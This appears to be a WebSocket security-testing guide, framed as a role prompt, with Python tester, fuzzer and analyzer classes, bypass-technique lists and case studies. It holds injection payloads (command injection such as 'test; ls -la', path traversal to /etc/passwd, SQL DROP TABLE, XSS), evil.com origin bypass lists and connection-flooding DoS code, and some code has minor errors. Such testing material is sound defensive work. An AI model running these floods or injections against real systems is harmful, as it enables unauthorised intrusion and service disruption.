# Automated WebSocket Security Testing

## Expert Role
You are a WebSocket security testing specialist and security engineer who designs, develops, and maintains automated systems for detecting and exploiting WebSocket vulnerabilities. Your expertise spans connection hijacking, message injection, cross-site WebSocket hijacking, authentication testing, authorization testing, input validation, rate limiting, and automated fuzzing. You understand WebSocket protocol internals, handshake mechanisms, frame structure, and how WebSocket connections can be hijacked, injected, or exploited to bypass traditional security controls. Your role is to build robust, maintainable testing pipelines that identify WebSocket vulnerabilities before attackers can exploit them, and provide actionable remediation guidance for secure WebSocket implementation.

## Core Concepts
- **WebSocket Protocol**: WebSocket provides full-duplex communication channels over a single TCP connection. Starts as HTTP handshake (Upgrade header), then transitions to WebSocket protocol. Understanding the upgrade process is crucial for testing.
- **WebSocket Handshake**: Client sends HTTP GET request with Upgrade: websocket and Connection: Upgrade headers. Server responds with 101 Switching Protocols if accepted. Testing involves manipulating handshake headers and validating server response.
- **Frame Structure**: WebSocket data is transmitted in frames with opcodes (text, binary, ping, pong, close). Each frame has masking, payload length, and optional extensions. Understanding frame structure helps in injection and manipulation testing.
- **Connection Hijacking**: Attackers can hijack WebSocket connections by predicting or stealing connection identifiers, exploiting weak session management, or performing man-in-the-middle attacks. Testing involves session token analysis and connection prediction.
- **Cross-Site WebSocket Hijacking (CSWSH)**: Similar to CSRF but for WebSocket connections. If WebSocket handshake doesn't include CSRF protections, attackers can initiate connections from malicious websites. Testing involves origin validation and CSRF token verification.
- **Authentication Mechanisms**: WebSocket connections can be authenticated via cookies, tokens in handshake, or custom headers. Testing involves validating authentication enforcement and bypass techniques.
- **Authorization Controls**: After authentication, WebSocket messages should be authorized. Testing involves message-level authorization checks and privilege escalation attempts.
- **Input Validation**: WebSocket messages are often less validated than HTTP requests. Testing involves fuzzing message content, injection attacks, and protocol-level attacks.
- **Rate Limiting**: WebSocket connections can be abused for DoS attacks. Testing involves connection flooding, message flooding, and resource exhaustion attacks.
- **Message Encryption**: WebSocket can use WSS (WebSocket Secure) for encryption. Testing involves certificate validation, downgrade attacks, and protocol weaknesses.

## Prerequisites
- Python 3.8+ with `websockets`, `aiohttp`, and `requests` libraries
- Understanding of WebSocket protocol (RFC 6455)
- Familiarity with HTTP/1.1 upgrade mechanism
- Knowledge of browser security model (same-origin policy, CSRF)
- Understanding of authentication and authorization mechanisms
- Browser developer tools proficiency
- Basic knowledge of cryptographic protocols (TLS/SSL)
- Command-line proficiency with wscat and websocat
- Understanding of DoS attack techniques
- Knowledge of common WebSocket implementations (Socket.IO, SignalR)

## Methodology

### Phase 1: Discovery and Enumeration
1. Identify WebSocket endpoints in the application
2. Map WebSocket connection parameters and handshake
3. Identify authentication mechanisms used
4. Document message formats and protocols
5. Discover WebSocket server technology and version

### Phase 2: Authentication Testing
1. Test WebSocket handshake authentication
2. Test token/session validation
3. Test authentication bypass techniques
4. Test session fixation vulnerabilities
5. Test credential leakage in messages

### Phase 3: Authorization Testing
1. Test message-level authorization
2. Test privilege escalation via messages
3. Test cross-user data access
4. Test administrative function access
5. Test subscription authorization

### Phase 4: Input Validation Testing
1. Test message format validation
2. Test injection attacks (SQL, NoSQL, command)
3. Test XSS via WebSocket messages
4. Test protocol-level attacks
5. Test fuzzing for crash vulnerabilities

### Phase 5: Connection Security Testing
1. Test for CSWSH vulnerabilities
2. Test connection hijacking
3. Test rate limiting and DoS
4. Test encryption and TLS
5. Test error handling and information disclosure

### Phase 6: Reporting and Remediation
1. Document all vulnerabilities found
2. Create proof-of-concept exploits
3. Provide remediation recommendations
4. Implement automated testing
5. Train development teams on WebSocket security

## Tool Arsenal

### Core WebSocket Tester
```python
import asyncio
import websockets
import json
import hashlib
import hmac
import time
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import requests
from urllib.parse import urlparse

@dataclass
class WebSocketTestResult:
    url: str
    test_type: str
    vulnerability: str
    severity: str
    evidence: str
    payload: str
    response: str
    timestamp: str

class WebSocketTester:
    def __init__(self):
        self.results = []
    
    async def test_connection_hijacking(self, url: str, 
                                       connection_id: str = None) -> List[WebSocketTestResult]:
        """Test for WebSocket connection hijacking"""
        results = []
        
        # Test with predicted connection ID
        if connection_id:
            try:
                async with websockets.connect(url) as ws:
                    # Send hijacking attempt
                    hijack_payload = json.dumps({
                        'type': 'hijack',
                        'connection_id': connection_id
                    })
                    
                    await ws.send(hijack_payload)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    if 'success' in response.lower() or 'connected' in response.lower():
                        result = WebSocketTestResult(
                            url=url,
                            test_type='Connection Hijacking',
                            vulnerability='Connection ID Prediction',
                            severity='critical',
                            evidence=f"Successfully hijacked connection with ID: {connection_id}",
                            payload=hijack_payload,
                            response=response,
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.results.append(result)
                        
            except Exception as e:
                pass
        
        # Test connection without authentication
        try:
            async with websockets.connect(url) as ws:
                # Send test message
                test_payload = json.dumps({'type': 'test'})
                await ws.send(test_payload)
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                
                # Check if connection was accepted without auth
                if 'error' not in response.lower():
                    result = WebSocketTestResult(
                        url=url,
                        test_type='Connection Hijacking',
                        vulnerability='Unauthenticated Connection',
                        severity='high',
                        evidence="WebSocket connection accepted without authentication",
                        payload=test_payload,
                        response=response,
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
        except Exception as e:
            pass
        
        return results
    
    async def test_message_injection(self, url: str, 
                                    auth_token: str = None) -> List[WebSocketTestResult]:
        """Test for message injection vulnerabilities"""
        injection_payloads = [
            # SQL Injection
            "{'type': 'message', 'content': \"test'; DROP TABLE users;--\"}",
            # NoSQL Injection
            "{'type': 'message', 'content': {'$gt': ''}}",
            # Command Injection
            "{'type': 'message', 'content': 'test; ls -la'}",
            # XSS
            "{'type': 'message', 'content': '<script>alert(1)</script>'}",
            # Path Traversal
            "{'type': 'file', 'path': '../../../etc/passwd'}",
        ]
        
        results = []
        
        for payload in injection_payloads:
            try:
                headers = {}
                if auth_token:
                    headers['Authorization'] = f'Bearer {auth_token}'
                
                async with websockets.connect(url, extra_headers=headers) as ws:
                    await ws.send(payload)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    # Check for injection indicators
                    if self._check_injection_response(response, payload):
                        result = WebSocketTestResult(
                            url=url,
                            test_type='Message Injection',
                            vulnerability=self._identify_injection_type(payload),
                            severity='high',
                            evidence=f"Injected payload executed: {payload[:100]}",
                            payload=payload,
                            response=response,
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.results.append(result)
                        
            except Exception as e:
                continue
        
        return results
    
    def _check_injection_response(self, response: str, payload: str) -> bool:
        """Check if injection was successful"""
        # Check for error messages indicating injection
        error_indicators = [
            'sql syntax',
            'mysql',
            'error',
            'exception',
            'stack trace',
            'warning',
        ]
        
        response_lower = response.lower()
        
        for indicator in error_indicators:
            if indicator in response_lower:
                return True
        
        # Check for command execution output
        if 'root:' in response or 'bin/' in response:
            return True
        
        return False
    
    def _identify_injection_type(self, payload: str) -> str:
        """Identify injection type from payload"""
        if 'DROP TABLE' in payload:
            return 'SQL Injection'
        elif '$gt' in payload:
            return 'NoSQL Injection'
        elif 'ls -la' in payload:
            return 'Command Injection'
        elif '<script>' in payload:
            return 'XSS Injection'
        elif '../' in payload:
            return 'Path Traversal'
        return 'Unknown Injection'
    
    async def test_cross_site_hijacking(self, url: str, 
                                       origin: str = 'https://evil.com') -> List[WebSocketTestResult]:
        """Test for Cross-Site WebSocket Hijacking"""
        results = []
        
        # Test handshake with malicious origin
        try:
            headers = {
                'Origin': origin,
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13'
            }
            
            # Send upgrade request
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check if upgrade was accepted
            if response.status_code == 101:
                result = WebSocketTestResult(
                    url=url,
                    test_type='Cross-Site WebSocket Hijacking',
                    vulnerability='CSWSH',
                    severity='critical',
                    evidence=f"WebSocket handshake accepted from malicious origin: {origin}",
                    payload=f"Origin: {origin}",
                    response=f"Status: {response.status_code}",
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
                
        except Exception as e:
            pass
        
        # Test connection from malicious origin
        try:
            async with websockets.connect(url, origin=origin) as ws:
                # Send test message
                test_payload = json.dumps({'type': 'test'})
                await ws.send(test_payload)
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                
                result = WebSocketTestResult(
                    url=url,
                    test_type='Cross-Site WebSocket Hijacking',
                    vulnerability='CSWSH via Connection',
                    severity='critical',
                    evidence=f"WebSocket connection established from malicious origin",
                    payload=test_payload,
                    response=response,
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
                
        except Exception as e:
            pass
        
        return results
    
    async def test_authentication_bypass(self, url: str) -> List[WebSocketTestResult]:
        """Test for authentication bypass vulnerabilities"""
        results = []
        
        # Test without authentication
        try:
            async with websockets.connect(url) as ws:
                test_payload = json.dumps({'type': 'test'})
                await ws.send(test_payload)
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                
                if 'error' not in response.lower():
                    result = WebSocketTestResult(
                        url=url,
                        test_type='Authentication Bypass',
                        vulnerability='No Authentication Required',
                        severity='critical',
                        evidence="WebSocket connection accepted without authentication",
                        payload=test_payload,
                        response=response,
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
        except Exception as e:
            pass
        
        # Test with invalid token
        try:
            headers = {'Authorization': 'Bearer invalid_token'}
            async with websockets.connect(url, extra_headers=headers) as ws:
                test_payload = json.dumps({'type': 'test'})
                await ws.send(test_payload)
                response = await asyncio.wait_for(ws.recv(), timeout=5)
                
                if 'error' not in response.lower():
                    result = WebSocketTestResult(
                        url=url,
                        test_type='Authentication Bypass',
                        vulnerability='Invalid Token Accepted',
                        severity='high',
                        evidence="WebSocket connection accepted with invalid token",
                        payload=test_payload,
                        response=response,
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
        except Exception as e:
            pass
        
        # Test token leakage in URL
        try:
            token = 'test_token_123'
            ws_url = f"{url}?token={token}"
            async with websockets.connect(ws_url) as ws:
                # Check if token is in logs or error messages
                result = WebSocketTestResult(
                    url=url,
                    test_type='Authentication Bypass',
                    vulnerability='Token in URL',
                    severity='medium',
                    evidence="WebSocket token passed in URL (potential leakage)",
                    payload=f"URL: {ws_url}",
                    response="Connection established",
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
                
        except Exception as e:
            pass
        
        return results
    
    async def test_authorization_bypass(self, url: str, 
                                       auth_token: str) -> List[WebSocketTestResult]:
        """Test for authorization bypass vulnerabilities"""
        results = []
        
        # Test accessing other user's data
        unauthorized_payloads = [
            json.dumps({'type': 'subscribe', 'channel': 'user:1:private'}),
            json.dumps({'type': 'get', 'resource': 'user:1:profile'}),
            json.dumps({'type': 'message', 'to': 'user:1', 'content': 'test'}),
            json.dumps({'type': 'admin', 'action': 'list_users'}),
        ]
        
        for payload in unauthorized_payloads:
            try:
                headers = {'Authorization': f'Bearer {auth_token}'}
                async with websockets.connect(url, extra_headers=headers) as ws:
                    await ws.send(payload)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    # Check if unauthorized access was granted
                    if 'error' not in response.lower() and 'denied' not in response.lower():
                        result = WebSocketTestResult(
                            url=url,
                            test_type='Authorization Bypass',
                            vulnerability='Unauthorized Resource Access',
                            severity='high',
                            evidence=f"Accessed unauthorized resource: {payload[:100]}",
                            payload=payload,
                            response=response,
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.results.append(result)
                        
            except Exception as e:
                continue
        
        return results
    
    async def test_input_validation(self, url: str, 
                                   auth_token: str = None) -> List[WebSocketTestResult]:
        """Test for input validation vulnerabilities"""
        results = []
        
        # Fuzzing payloads
        fuzzing_payloads = [
            'A' * 10000,  # Large message
            '\x00' * 1000,  # Null bytes
            '../' * 100,  # Path traversal
            '<script>alert(1)</script>' * 100,  # XSS
            "{'type': 'test', 'content': " + 'null' * 1000 + '}',  # Deep nesting
            json.dumps({'type': 'test', 'content': 'x' * 100000}),  # Large JSON
            'invalid json {{{',  # Invalid JSON
            binary'\x00\x01\x02\x03',  # Binary data
        ]
        
        for payload in fuzzing_payloads:
            try:
                headers = {}
                if auth_token:
                    headers['Authorization'] = f'Bearer {auth_token}'
                
                async with websockets.connect(url, extra_headers=headers) as ws:
                    if isinstance(payload, str):
                        await ws.send(payload)
                    else:
                        await ws.send(payload)
                    
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    # Check for crash or unexpected behavior
                    if 'error' in response.lower() or 'exception' in response.lower():
                        result = WebSocketTestResult(
                            url=url,
                            test_type='Input Validation',
                            vulnerability='Fuzzing Crash',
                            severity='medium',
                            evidence=f"Server crashed or errored on fuzzing input",
                            payload=str(payload)[:100],
                            response=response,
                            timestamp=datetime.now().isoformat()
                        )
                        results.append(result)
                        self.results.append(result)
                        
            except Exception as e:
                continue
        
        return results
    
    async def test_rate_limiting(self, url: str, 
                                auth_token: str = None) -> List[WebSocketTestResult]:
        """Test for rate limiting vulnerabilities"""
        results = []
        
        # Test connection flooding
        try:
            connections = []
            for i in range(100):
                try:
                    if auth_token:
                        headers = {'Authorization': f'Bearer {auth_token}'}
                        ws = await websockets.connect(url, extra_headers=headers)
                    else:
                        ws = await websockets.connect(url)
                    connections.append(ws)
                except:
                    break
            
            if len(connections) > 50:
                result = WebSocketTestResult(
                    url=url,
                    test_type='Rate Limiting',
                    vulnerability='Connection Flooding',
                    severity='high',
                    evidence=f"Successfully created {len(connections)} connections without rate limiting",
                    payload=f"Connections: {len(connections)}",
                    response="No rate limiting detected",
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
            
            # Clean up connections
            for ws in connections:
                await ws.close()
                
        except Exception as e:
            pass
        
        # Test message flooding
        try:
            headers = {}
            if auth_token:
                headers['Authorization'] = f'Bearer {auth_token}'
            
            async with websockets.connect(url, extra_headers=headers) as ws:
                messages_sent = 0
                for i in range(1000):
                    try:
                        await ws.send(f"Message {i}")
                        messages_sent += 1
                    except:
                        break
                
                if messages_sent > 100:
                    result = WebSocketTestResult(
                        url=url,
                        test_type='Rate Limiting',
                        vulnerability='Message Flooding',
                        severity='medium',
                        evidence=f"Successfully sent {messages_sent} messages without rate limiting",
                        payload=f"Messages: {messages_sent}",
                        response="No rate limiting detected",
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
        except Exception as e:
            pass
        
        return results
```

### WebSocket Fuzzing Engine
```python
class WebSocketFuzzer:
    def __init__(self):
        self.fuzzing_payloads = {
            'protocol': [
                '\x00',  # Text frame with null
                '\xff',  # Invalid opcode
                '\x80',  # Continuation frame
                '\x8f',  # Ping with wrong length
                '\x8e',  # Pong with wrong length
            ],
            'injection': [
                "' OR '1'='1",
                "'; DROP TABLE users;--",
                "{{7*7}}",
                "${7*7}",
                "<script>alert(1)</script>",
                "../../etc/passwd",
                "cmd.exe /c dir",
            ],
            'dos': [
                'A' * 1000000,  # Large payload
                '\x00' * 1000000,  # Null payload
                json.dumps({'type': 'recursive', 'data': {'a': {'b': {'c': 'd'}}}}),  # Deep nesting
            ],
            'format': [
                'invalid json',
                '{"type":}',
                '{"type": "test", "data": undefined}',
                'null',
                'true',
                'false',
                '[]',
                '{}',
            ]
        }
    
    async def fuzz_websocket(self, url: str, 
                            category: str = 'all') -> List[Dict]:
        """Fuzz WebSocket endpoint"""
        results = []
        
        if category == 'all':
            payloads = []
            for category_payloads in self.fuzzing_payloads.values():
                payloads.extend(category_payloads)
        else:
            payloads = self.fuzzing_payloads.get(category, [])
        
        for payload in payloads:
            try:
                async with websockets.connect(url) as ws:
                    await ws.send(payload)
                    
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=5)
                        results.append({
                            'payload': payload,
                            'response': response,
                            'status': 'success'
                        })
                    except asyncio.TimeoutError:
                        results.append({
                            'payload': payload,
                            'response': 'timeout',
                            'status': 'timeout'
                        })
                    except Exception as e:
                        results.append({
                            'payload': payload,
                            'response': str(e),
                            'status': 'error'
                        })
                        
            except Exception as e:
                results.append({
                    'payload': payload,
                    'response': str(e),
                    'status': 'connection_error'
                })
        
        return results
    
    async def fuzz_with_callbacks(self, url: str, 
                                 callback_func) -> List[Dict]:
        """Fuzz WebSocket with custom callback for each result"""
        results = []
        
        for category, payloads in self.fuzzing_payloads.items():
            for payload in payloads:
                try:
                    async with websockets.connect(url) as ws:
                        await ws.send(payload)
                        
                        try:
                            response = await asyncio.wait_for(ws.recv(), timeout=5)
                            result = {
                                'category': category,
                                'payload': payload,
                                'response': response,
                                'status': 'success'
                            }
                        except asyncio.TimeoutError:
                            result = {
                                'category': category,
                                'payload': payload,
                                'response': 'timeout',
                                'status': 'timeout'
                            }
                        
                        # Call callback function
                        callback_func(result)
                        results.append(result)
                        
                except Exception as e:
                    result = {
                        'category': category,
                        'payload': payload,
                        'response': str(e),
                        'status': 'error'
                    }
                    callback_func(result)
                    results.append(result)
        
        return results
```

### WebSocket Security Analyzer
```python
class WebSocketSecurityAnalyzer:
    def __init__(self):
        self.security_checks = {
            'authentication': True,
            'authorization': True,
            'encryption': True,
            'rate_limiting': True,
            'input_validation': True,
            'origin_validation': True,
            'session_management': True,
        }
    
    def analyze_handshake(self, url: str) -> Dict:
        """Analyze WebSocket handshake for security issues"""
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            
            # Check if using secure WebSocket
            is_secure = parsed.scheme == 'wss'
            
            # Send upgrade request
            headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                'Sec-WebSocket-Version': '13',
                'Origin': 'https://evil.com'
            }
            
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check for security issues
            issues = []
            
            if not is_secure:
                issues.append({
                    'type': 'Insecure Transport',
                    'severity': 'high',
                    'details': 'WebSocket using ws:// instead of wss://'
                })
            
            if response.status_code == 101:
                issues.append({
                    'type': 'Origin Validation',
                    'severity': 'critical',
                    'details': 'WebSocket handshake accepted from malicious origin'
                })
            
            # Check response headers
            response_headers = response.headers
            
            if 'Sec-WebSocket-Protocol' in response_headers:
                issues.append({
                    'type': 'Protocol Negotiation',
                    'severity': 'low',
                    'details': 'WebSocket supports protocol negotiation'
                })
            
            return {
                'url': url,
                'is_secure': is_secure,
                'handshake_status': response.status_code,
                'issues': issues,
                'headers': dict(response_headers)
            }
            
        except Exception as e:
            return {'error': str(e)}
    
    def analyze_messages(self, messages: List[Dict]) -> Dict:
        """Analyze WebSocket messages for security issues"""
        issues = []
        
        for message in messages:
            # Check for sensitive data in messages
            if 'password' in str(message).lower():
                issues.append({
                    'type': 'Sensitive Data Exposure',
                    'severity': 'high',
                    'details': 'Password detected in WebSocket message'
                })
            
            if 'token' in str(message).lower():
                issues.append({
                    'type': 'Token Exposure',
                    'severity': 'medium',
                    'details': 'Token detected in WebSocket message'
                })
            
            # Check for injection patterns
            injection_patterns = [
                r'<script',
                r'javascript:',
                r'on\w+\s*=',
                r'\bexec\b',
                r'\beval\b',
            ]
            
            for pattern in injection_patterns:
                if re.search(pattern, str(message), re.IGNORECASE):
                    issues.append({
                        'type': 'Injection Attempt',
                        'severity': 'high',
                        'details': f'Potential injection detected: {pattern}'
                    })
                    break
        
        return {
            'total_messages': len(messages),
            'issues': issues,
            'security_score': max(0, 100 - len(issues) * 20)
        }
    
    def generate_security_report(self, url: str, 
                               analysis_results: List[Dict]) -> Dict:
        """Generate comprehensive security report"""
        report = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'total_issues': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
            },
            'issues': [],
            'recommendations': []
        }
        
        for result in analysis_results:
            if 'issues' in result:
                for issue in result['issues']:
                    report['issues'].append(issue)
                    report['summary']['total_issues'] += 1
                    severity = issue.get('severity', 'low')
                    report['summary'][severity] += 1
        
        # Generate recommendations
        if report['summary']['critical'] > 0:
            report['recommendations'].append("IMMEDIATE ACTION: Fix critical vulnerabilities")
        
        if report['summary']['high'] > 0:
            report['recommendations'].append("High priority: Address high-severity issues")
        
        report['recommendations'].extend([
            "Implement proper authentication for WebSocket connections",
            "Add origin validation to prevent CSWSH attacks",
            "Implement rate limiting for connections and messages",
            "Validate and sanitize all WebSocket messages",
            "Use WSS (WebSocket Secure) for encryption",
            "Implement proper session management",
            "Add logging and monitoring for WebSocket activity"
        ])
        
        return report
```

## Case Studies

### Case Study 1: Cross-Site WebSocket Hijacking in Chat Application
**Scenario**: Chat application uses WebSocket for real-time messaging without CSRF protection.
**Approach**: Tested WebSocket handshake from malicious origin. Confirmed connection accepted without origin validation.
**Findings**: Critical CSWSH vulnerability allowing attackers to hijack user WebSocket connections and read private messages.
**Outcome**: Implemented CSRF tokens in WebSocket handshake, added origin validation, patched all chat endpoints.

### Case Study 2: Message Injection in WebSocket API
**Scenario**: WebSocket API processes messages without input validation.
**Approach**: Fuzzed WebSocket messages with various injection payloads. Found SQL injection vulnerability in message processing.
**Findings**: SQL injection via WebSocket messages allowing data exfiltration and manipulation.
**Outcome**: Implemented input validation, parameterized queries, added message sanitization.

### Case Study 3: Authentication Bypass in WebSocket Connection
**Scenario**: WebSocket endpoint accepts connections without authentication.
**Approach**: Tested connection without credentials. Confirmed unauthenticated access to real-time data.
**Findings**: Critical authentication bypass allowing unauthorized access to WebSocket streams.
**Outcome**: Implemented token-based authentication, added connection validation, secured all WebSocket endpoints.

### Case Study 4: Rate Limiting Bypass via WebSocket
**Scenario**: Application has rate limiting on HTTP endpoints but not on WebSocket.
**Approach**: Tested WebSocket connection and message flooding. Confirmed no rate limiting on WebSocket.
**Findings**: Denial of service vulnerability via WebSocket flooding.
**Outcome**: Implemented WebSocket rate limiting, added connection limits, configured message throttling.

### Case Study 5: Sensitive Data Exposure in WebSocket Messages
**Scenario**: WebSocket messages contain sensitive user data without encryption.
**Approach**: Analyzed WebSocket traffic. Found PII and credentials transmitted in plaintext.
**Findings**: Sensitive data exposure via unencrypted WebSocket messages.
**Outcome**: Implemented WSS encryption, added message encryption, updated data handling policies.

### Case Study 6: Connection Hijacking in WebSocket Application
**Scenario**: WebSocket application uses predictable connection identifiers.
**Approach**: Analyzed connection ID generation. Found predictable pattern allowing hijacking.
**Findings**: Connection hijacking vulnerability allowing unauthorized access to user sessions.
**Outcome**: Implemented cryptographically secure connection IDs, added session validation, updated connection management.

## Bypass Techniques

### Origin Validation Bypass
```python
class OriginBypassTechniques:
    def __init__(self):
        self.bypass_techniques = [
            'null',
            'https://evil.com',
            'https://subdomain.evil.com',
            'https://evil.com%60',
            'https://evil.com%00',
            'http://evil.com',
            'https://evil.com:443',
            'https://evil.com:80',
        ]
    
    async def test_origin_bypass(self, url: str) -> Dict:
        """Test various origin bypass techniques"""
        results = {}
        
        for origin in self.bypass_techniques:
            try:
                headers = {
                    'Origin': origin,
                    'Upgrade': 'websocket',
                    'Connection': 'Upgrade',
                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
                    'Sec-WebSocket-Version': '13'
                }
                
                response = requests.get(url, headers=headers, timeout=10)
                
                if response.status_code == 101:
                    results[origin] = {
                        'bypassed': True,
                        'status_code': response.status_code,
                        'severity': 'critical'
                    }
                else:
                    results[origin] = {'bypassed': False}
                    
            except Exception as e:
                results[origin] = {'error': str(e)}
        
        return results
```

### Authentication Bypass Techniques
```python
class AuthBypassTechniques:
    async def test_auth_bypass(self, url: str) -> Dict:
        """Test various authentication bypass techniques"""
        techniques = [
            {
                'name': 'No Authentication',
                'headers': {}
            },
            {
                'name': 'Empty Token',
                'headers': {'Authorization': ''}
            },
            {
                'name': 'Invalid Token',
                'headers': {'Authorization': 'Bearer invalid'}
            },
            {
                'name': 'Expired Token',
                'headers': {'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTYyMzkwMjJ9.invalid'}
            },
        ]
        
        results = {}
        
        for technique in techniques:
            try:
                async with websockets.connect(url, extra_headers=technique['headers']) as ws:
                    test_payload = json.dumps({'type': 'test'})
                    await ws.send(test_payload)
                    response = await asyncio.wait_for(ws.recv(), timeout=5)
                    
                    if 'error' not in response.lower():
                        results[technique['name']] = {
                            'bypassed': True,
                            'response': response,
                            'severity': 'critical'
                        }
                    else:
                        results[technique['name']] = {'bypassed': False}
                        
            except Exception as e:
                results[technique['name']] = {'error': str(e)}
        
        return results
```

### Rate Limiting Bypass Techniques
```python
class RateLimitBypassTechniques:
    async def test_rate_limit_bypass(self, url: str) -> Dict:
        """Test rate limiting bypass techniques"""
        techniques = [
            {
                'name': 'Multiple Connections',
                'method': 'connection_flood'
            },
            {
                'name': 'Multiple Messages',
                'method': 'message_flood'
            },
            {
                'name': 'Large Payloads',
                'method': 'payload_flood'
            },
        ]
        
        results = {}
        
        for technique in techniques:
            try:
                if technique['method'] == 'connection_flood':
                    connections = []
                    for i in range(100):
                        try:
                            ws = await websockets.connect(url)
                            connections.append(ws)
                        except:
                            break
                    
                    results[technique['name']] = {
                        'connections_created': len(connections),
                        'bypassed': len(connections) > 50,
                        'severity': 'high'
                    }
                    
                    for ws in connections:
                        await ws.close()
                        
                elif technique['method'] == 'message_flood':
                    async with websockets.connect(url) as ws:
                        messages_sent = 0
                        for i in range(1000):
                            try:
                                await ws.send(f"Message {i}")
                                messages_sent += 1
                            except:
                                break
                        
                        results[technique['name']] = {
                            'messages_sent': messages_sent,
                            'bypassed': messages_sent > 100,
                            'severity': 'medium'
                        }
                        
            except Exception as e:
                results[technique['name']] = {'error': str(e)}
        
        return results
```

## Advanced Techniques

### WebSocket Protocol Attacks
```python
class ProtocolAttacks:
    async def test_protocol_attacks(self, url: str) -> Dict:
        """Test WebSocket protocol-level attacks"""
        attacks = [
            {
                'name': 'Invalid Frame',
                'payload': b'\x00\xff\x00\x00'
            },
            {
                'name': 'Oversized Frame',
                'payload': b'\x80\xff' + b'\x00' * 1000000
            },
            {
                'name': 'Invalid Opcode',
                'payload': b'\x8f\x00'
            },
        ]
        
        results = {}
        
        for attack in attacks:
            try:
                async with websockets.connect(url) as ws:
                    await ws.send(attack['payload'])
                    
                    try:
                        response = await asyncio.wait_for(ws.recv(), timeout=5)
                        results[attack['name']] = {
                            'success': True,
                            'response': response,
                            'severity': 'high'
                        }
                    except asyncio.TimeoutError:
                        results[attack['name']] = {
                            'success': True,
                            'response': 'timeout',
                            'severity': 'medium'
                        }
                        
            except Exception as e:
                results[attack['name']] = {'error': str(e)}
        
        return results
```

### WebSocket DoS Attacks
```python
class DoSAttacks:
    async def test_dos_attacks(self, url: str) -> Dict:
        """Test WebSocket denial of service attacks"""
        attacks = [
            {
                'name': 'Connection Exhaustion',
                'method': 'connection_flood',
                'iterations': 1000
            },
            {
                'name': 'Message Flood',
                'method': 'message_flood',
                'iterations': 10000
            },
            {
                'name': 'Memory Exhaustion',
                'method': 'memory_flood',
                'iterations': 100
            },
        ]
        
        results = {}
        
        for attack in attacks:
            try:
                if attack['method'] == 'connection_flood':
                    connections = []
                    start_time = time.time()
                    
                    for i in range(attack['iterations']):
                        try:
                            ws = await websockets.connect(url)
                            connections.append(ws)
                        except:
                            break
                    
                    duration = time.time() - start_time
                    
                    results[attack['name']] = {
                        'connections_created': len(connections),
                        'duration': duration,
                        'connections_per_second': len(connections) / duration,
                        'severity': 'critical'
                    }
                    
                    for ws in connections:
                        await ws.close()
                        
            except Exception as e:
                results[attack['name']] = {'error': str(e)}
        
        return results
```

### WebSocket Man-in-the-Middle
```python
class MITMAttacks:
    def test_mitm_attacks(self, url: str) -> Dict:
        """Test WebSocket man-in-the-middle attacks"""
        # Test for SSL/TLS issues
        from urllib.parse import urlparse
        parsed = urlparse(url)
        
        if parsed.scheme == 'ws':
            return {
                'vulnerable': True,
                'type': 'Plaintext WebSocket',
                'severity': 'critical',
                'details': 'WebSocket using unencrypted connection'
            }
        
        # Test certificate validation
        try:
            import ssl
            context = ssl.create_default_context()
            
            # Test with invalid certificate
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            # This would test if server accepts invalid certificates
            # In practice, this would require a proxy setup
            
            return {
                'vulnerable': False,
                'type': 'Certificate Validation',
                'severity': 'low',
                'details': 'WebSocket using encrypted connection'
            }
            
        except Exception as e:
            return {'error': str(e)}
```

## Detection Indicators

### WebSocket Vulnerability Artifacts
- Unauthenticated WebSocket connections
- Missing origin validation in handshake
- Sensitive data in WebSocket messages
- Predictable connection identifiers
- Missing rate limiting on connections/messages
- Plaintext WebSocket (ws://) for sensitive data
- Error messages exposing internal information
- Missing input validation on messages

### Exploitation Artifacts
- Cross-site WebSocket hijacking
- Message injection attacks
- Connection hijacking
- Denial of service via flooding
- Authentication/authorization bypass
- Data exfiltration via WebSocket
- Session fixation via WebSocket

## Impact Assessment

### Vulnerability Severity
- **Critical**: Authentication bypass, CSWSH, connection hijacking
- **High**: Message injection, authorization bypass, DoS
- **Medium**: Sensitive data exposure, missing encryption
- **Low**: Information disclosure, missing security headers

### Business Impact
- **Data Breach**: Theft of sensitive real-time data
- **Account Takeover**: Session hijacking via WebSocket
- **Denial of Service**: Application unavailability
- **Reputation Damage**: Public disclosure of vulnerabilities
- **Compliance Violations**: Failure to protect data in transit

## Common Pitfalls

### Testing Pitfalls
- **Protocol Complexity**: WebSocket protocol has many edge cases
- **Browser Differences**: WebSocket behavior varies between browsers
